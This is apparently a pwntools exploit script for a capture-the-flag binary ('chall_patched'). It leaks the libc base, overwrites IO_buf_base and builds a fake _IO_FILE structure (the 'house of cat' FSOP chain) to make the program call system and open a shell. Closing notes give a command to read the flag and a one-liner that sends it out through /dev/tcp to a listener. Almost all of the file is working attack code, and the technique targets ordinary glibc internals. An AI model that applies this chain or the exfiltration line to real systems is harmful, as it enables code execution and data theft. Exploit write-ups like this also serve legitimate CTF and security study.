from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./chall_patched")
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

sla("> ","1")
ru("libc_base = ")
libc = int(ru('\n'),16)
leak("libc",hex(libc))
IO_buf_base = libc + 0x203918
sla("> ","2")
sla("Mem: ",hex(IO_buf_base)[2:])
IO_list_all = libc + 0x2044c0
# house of cat exploit chain
fake_io_addr = libc + 0x2043a8
# fake_IO_FILE = b"\xd0\x06;sh;\x00\x00"
fake_IO_FILE = b"\xd0\x06;sh;\x00\x00"
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(0x7777)
fake_IO_FILE += p64(1) + p64(2)
fake_IO_FILE += p64(fake_io_addr + 0xB0)
fake_IO_FILE += p64(libc + 0x58740)  # call addr(call setcontext/system)
fake_IO_FILE = fake_IO_FILE.ljust(0x68, b"\x00")
fake_IO_FILE += p64(0)
fake_IO_FILE = fake_IO_FILE.ljust(0x88, b"\x00")
fake_IO_FILE += p64(libc+0x204140)
fake_IO_FILE = fake_IO_FILE.ljust(0xA0, b"\x00")
fake_IO_FILE += p64(fake_io_addr + 0x30)
fake_IO_FILE = fake_IO_FILE.ljust(0xC0, b"\x00")
fake_IO_FILE += p64(1)  # mode=1
fake_IO_FILE = fake_IO_FILE.ljust(0xD8, b"\x00")
fake_IO_FILE += p64(
    libc + 0x202228 + 0x30
)  # vtable=IO_wfile_jumps+0x10  (vtable = IO_wfile_jumps + 0x30 for FSOP）
fake_IO_FILE += p64(0) * 6
fake_IO_FILE += p64(fake_io_addr + 0x40)
# fake_IO_FILE += p64(0x666)

print("Len", len(fake_IO_FILE))
sa("> ",p64(libc+0x203900)*3+p64(IO_list_all-8-len(fake_IO_FILE))+p64(IO_list_all+8))
if args.GDB:
    gdb.attach(r,"b _IO_flush_all\nb _IO_switch_to_wget_mode")
s(p64(0xDEADBEEF)+fake_IO_FILE+p64(fake_io_addr))

sl("3")
sla("> ","3")

r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''